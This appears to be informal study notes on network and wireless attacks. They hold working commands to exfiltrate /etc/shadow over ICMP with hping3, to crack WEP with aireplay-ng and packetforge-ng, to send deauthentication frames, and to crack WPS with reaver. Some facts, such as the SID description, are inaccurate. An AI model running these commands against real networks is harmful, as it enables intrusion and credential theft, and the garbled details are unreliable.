*Tcp Session hijacking- Taking already established TCP session of another user impersonating them.
  Important prerequisites in tcp session hijacking- 1.) Cleartextprotocols
                                                    2.) predicting correct TCP sequence numbers.
                                                    3.) packets shouldnt be digitally signed.
                                                   
* Microsoft Security ID(SID) is a 128 bit permanent identifier for users in windows system.
* Using ICMP for exfiltration of data, 
      Server Side:  sudo hping3 -I eth0 192.168.43.75 --icmp -d 100 --sign signature --file /etc/shadow
      Client side: sudo hping3 -I eth0 --listen signature --icmp
* In context of wireless networks, fragmentation attacks deal with extracting the key material from one packet and use this request to send to AP to receive more key information.
    Process - aireplay-ng -5 -b <AP MAC address> -h <source MAC address> wlan0
              packetforge-ng -0 -a <AP MAC address> -h <source MAC address> -y <saved PRGA file> -w <crafted packet output>  (Crafting the packet using the key received).
              aireplay-ng -r <crafted packet output> wlan0
              ((The above process can be used to crack the WEP More fastly).
              
* Deauthentication attacks - 802.11 wifi protocol includes a frame where the client can terminate their connection. By spoofing the MAC Address of client, deauth frame can de sent on behalf of user.
    process - aireplay-ng -0 1 -a <MAC address> wlan0
    
* Launching Pixie dust attack to crack WPS 
    reaver -i wlan0 -b <AP MAC address> -c <AP channel> -K 1
    reaver -i wlanmon0 -b 00:90:4C:C1:AB:CD -p "" -N -vv(Null Pin is used)
    
* One of the open sourve tool to test ICS is:ICSSPLOIt
* Compromising the router and listening theor communications through GRE tunnel is one of the method to listen to communications that pass over router.
